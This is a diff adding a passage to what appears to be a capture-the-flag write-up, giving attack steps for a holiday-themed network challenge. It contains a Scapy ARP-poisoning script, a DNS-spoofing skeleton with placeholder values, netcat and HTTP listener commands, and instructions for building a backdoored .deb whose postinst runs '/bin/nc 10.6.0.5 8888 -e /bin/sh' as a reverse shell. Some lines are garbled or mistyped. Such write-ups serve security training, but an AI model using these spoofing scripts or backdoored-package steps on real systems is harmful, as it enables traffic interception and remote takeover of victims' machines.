@@ -337,6 +337,119 @@ Go to the NetWars room on the roof and help Alabaster Snowball get access back t
 Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. 
 Who recused herself from the vote described on the document?
 ```
+Pre Steps
+```
+tcpdump -nni eth0
+python3 -m http.server 80
+nc -lvp 8888
+```
+Step 1 - ARP Posioning
+```
+#!/usr/bin/python3
+from scapy.all import *
+import netifaces as ni
+import uuid
+
+# Our eth0 ip
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our eth0 mac address
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+
+def handle_arp_packets(packet):
+    # if arp request, then we need to fill this out to send back our mac as the response
+    if ARP in packet and packet[ARP].op == 1:
+        ether_resp = Ether(dst="4c:24:57:ab:ed:84", type=0x806, src="02:42:0a:06:00:02")
+
+        arp_response = ARP(pdst="10.6.6.35")
+        arp_response.op = 2
+        arp_response.plen = 4
+        arp_response.hwlen = 6
+        arp_response.ptype = 0x800
+        arp_response.hwtype = 0x1
+
+        arp_response.hwsrc = "02:42:0a:06:00:02"
+        arp_response.psrc = "10.6.6.53"
+        arp_response.hwdst = "4c:24:57:ab:ed:84"
+        arp_response.pdst = "10.6.6.35"
+
+        response = ether_resp/arp_response
+
+        sendp(response, iface="eth0")
+
+def main():
+    # We only want arp requests
+    berkeley_packet_filter = "(arp[6:2] = 1)"
+    # sniffing for one packet that will be sent to a function, while storing none
+    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)
+
+if __name__ == "__main__":
+    main()dev
+
+```
+Step 2 - DNS Poisoing
+```
+from scapy.all import *
+import netifaces as ni
+import uuid
+
+# Our eth0 IP
+ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+# Our Mac Addr
+macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+# destination ip we arp spoofed
+ipaddr_we_arp_spoofed = "10.6.1.10"
+
+def handle_dns_request(packet):
+    # Need to change mac addresses, Ip Addresses, and ports below.
+    # We also need
+    eth = Ether(src="00:00:00:00:00:00", dst="00:00:00:00:00:00")   # need to replace mac addresses
+    ip  = IP(dst="0.0.0.0", src="0.0.0.0")                          # need to replace IP addresses
+    udp = UDP(dport=99999, sport=99999)                             # need to replace ports
+    dns = DNS(
+        # MISSING DNS RESPONSE LAYER VALUES 
+    )
+    dns_response = eth / ip / udp / dns
+    sendp(dns_response, iface="eth0")
+
+def main():
+    berkeley_packet_filter = " and ".join( [
+        "udp dst port 53",                              # dns
+        "udp[10] & 0x80 = 0",                           # dns request
+        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
+        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
+    ] )
+
+    # sniff the eth0 int without storing packets in memory and stopping after one dns request
+    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
+
+if __name__ == "__main__":
+    main()
+```
+Step 3 - Packaging malicious .deb file suriv_amd64.deb
+```
+dpgk -x nc-traditional extra
+mkdir -p extra/DEBIAN
+
+file extra/DEBIAN/control
+Package: nc
+Version: 1.0
+Section: custom
+Priority: optional
+Architecture: all
+Essential: no
+Installed-Size: 1024
+Maintainer: linuxconfig.org
+Description: Print linuxconfig.org on the screen
+
+file extra/DEBIAN/postinst
+/bin/nc 10.6.0.5 8888 -e /bin/sh
+
+chmod 755 extra/DEBIAN/postinst
+dpkg-deb --build extra
+mv extra.deb pub/jfrost/backdoor/suriv_amd64.deb
+```
+<img src="">
+
 ### 10) Defeat Fingerprint Sensor
 ```
 Bypass the Santavator fingerprint sensor. 
